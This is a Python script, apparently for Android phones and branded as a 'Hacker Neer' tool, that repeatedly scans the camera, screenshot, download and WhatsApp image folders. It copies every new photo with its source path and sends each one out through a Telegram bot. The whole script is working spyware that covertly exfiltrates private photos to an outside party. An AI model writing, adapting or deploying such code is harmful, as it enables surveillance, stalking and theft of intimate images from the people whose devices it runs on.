#!/usr/bin/env python3
import os
import json
import time
import shutil
import hashlib
from datetime import datetime
import subprocess
import threading

with open('config.json', 'r') as f:
    CONFIG = json.load(f)

# Import Telegram bot
try:
    from telegram_bot import TelegramBot
    telegram_bot = TelegramBot()
except:
    telegram_bot = None

class AutoCollector:
    def __init__(self):
        self.collect_folder = CONFIG['collect_folder']
        self.scan_interval = CONFIG['scan_interval']
        self.extensions = CONFIG['image_extensions']
        self.min_size = CONFIG['min_file_size']
        self.collected_hashes = set()
        
        os.makedirs(self.collect_folder, exist_ok=True)
        self.load_hashes()
    
    def load_hashes(self):
        hash_file = os.path.join(self.collect_folder, '.hashes')
        if os.path.exists(hash_file):
            with open(hash_file, 'r') as f:
                self.collected_hashes = set(f.read().splitlines())
    
    def save_hashes(self):
        hash_file = os.path.join(self.collect_folder, '.hashes')
        with open(hash_file, 'w') as f:
            f.write('\n'.join(self.collected_hashes))
    
    def get_gallery_paths(self):
        paths = [
            '/storage/emulated/0/DCIM',
            '/storage/emulated/0/Pictures',
            '/storage/emulated/0/Download',
            '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
            '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images',
            '/storage/emulated/0/Screenshots',
            '/storage/emulated/0/Camera',
        ]
        
        try:
            result = subprocess.run(['find', '/storage/emulated/0', '-type', 'd', 
                                   '-name', '*DCIM*', '-o', '-name', '*Pictures*'], 
                                  capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.strip() and os.path.exists(line.strip()):
                    paths.append(line.strip())
        except:
            pass
        
        return list(set(paths))
    
    def scan_photos(self):
        print(f"🔍 Scanning gallery... ({self.scan_interval}s interval)")
        gallery_paths = self.get_gallery_paths()
        new_photos = []
        
        for gallery_path in gallery_paths:
            if not os.path.exists(gallery_path):
                continue
            try:
                for root, dirs, files in os.walk(gallery_path):
                    for file in files:
                        ext = os.path.splitext(file)[1].lower()
                        if ext not in self.extensions:
                            continue
                        
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < self.min_size:
                                continue
                        except:
                            continue
                        
                        file_hash = self.get_hash(file_path)
                        if file_hash and file_hash not in self.collected_hashes:
                            new_photos.append(file_path)
            except Exception as e:
                print(f"⚠️ Error scanning {gallery_path}: {e}")
        
        return new_photos
    
    def get_hash(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                return hashlib.md5(f.read()).hexdigest()
        except:
            return None
    
    def collect_photo(self, file_path):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
            ext = os.path.splitext(file_path)[1]
            filename = f"auto_{timestamp}{ext}"
            dest_path = os.path.join(self.collect_folder, filename)
            
            shutil.copy2(file_path, dest_path)
            
            file_hash = self.get_hash(file_path)
            if file_hash:
                self.collected_hashes.add(file_hash)
                self.save_hashes()
            
            size = os.path.getsize(file_path) / 1024
            print(f"📸 Auto-collected: {filename} ({size:.1f} KB)")
            
            # Save metadata
            metadata = {
                'filename': filename,
                'original': os.path.basename(file_path),
                'size': os.path.getsize(file_path),
                'collected_at': datetime.now().isoformat(),
                'source': file_path,
                'type': 'auto'
            }
            meta_path = os.path.join(self.collect_folder, f"{filename}.json")
            with open(meta_path, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            # Send to Telegram
            if CONFIG['telegram']['enabled'] and telegram_bot:
                self.send_to_telegram(dest_path, metadata)
            
            return True
        except Exception as e:
            print(f"❌ Collect error: {e}")
            return False
    
    def send_to_telegram(self, photo_path, metadata):
        """Send photo to Telegram with credit"""
        try:
            caption = f"""
📸 *Auto-Collected Photo*

📁 *File:* `{metadata['filename']}`
📅 *Time:* {metadata['collected_at']}
📊 *Size:* {metadata['size']/1024:.1f} KB
📂 *Source:* Gallery Auto-Scan

━━━━━━━━━━━━━━━━━━━━━
🔥 *Tool By:* Hacker Neer
📺 *YouTube:* @hackerneer
🔗 *Link:* https://youtube.com/@hackerneer
━━━━━━━━━━━━━━━━━━━━━
            """
            
            telegram_bot.send_photo(photo_path, caption)
            
        except Exception as e:
            print(f"❌ Telegram send error: {e}")
    
    def run(self):
        print("""
╔══════════════════════════════════════════════════════════╗
║   📸 Auto Gallery Collector - By Hacker Neer           ║
║   🔄 Scanning every 2 seconds                          ║
║   🤖 Telegram: ✅ Enabled                              ║
║   📁 Photos: collected/                               ║
║                                                        ║
║   🔗 YouTube: https://youtube.com/@hackerneer         ║
║   💻 Channel: @hackerneer                             ║
║   Press CTRL+C to stop                                 ║
╚══════════════════════════════════════════════════════════╝
        """)
        
        # Send startup message
        if CONFIG['telegram']['enabled'] and telegram_bot:
            telegram_bot.send_message("🚀 *Gallery Collector Started!*\n\nScanning gallery every 2 seconds.\n\n🔥 Tool By: Hacker Neer\n📺 YouTube: @hackerneer")
        
        while True:
            try:
                new_photos = self.scan_photos()
                if new_photos:
                    print(f"📸 Found {len(new_photos)} new photos")
                    for photo in new_photos:
                        self.collect_photo(photo)
                
                time.sleep(self.scan_interval)
            except KeyboardInterrupt:
                print("\n👋 Stopping collector...")
                if CONFIG['telegram']['enabled'] and telegram_bot:
                    telegram_bot.send_message("🛑 *Gallery Collector Stopped*\n\n🔥 Tool By: Hacker Neer")
                break
            except Exception as e:
                print(f"⚠️ Error: {e}")
                time.sleep(self.scan_interval)

if __name__ == "__main__":
    collector = AutoCollector()
    collector.run()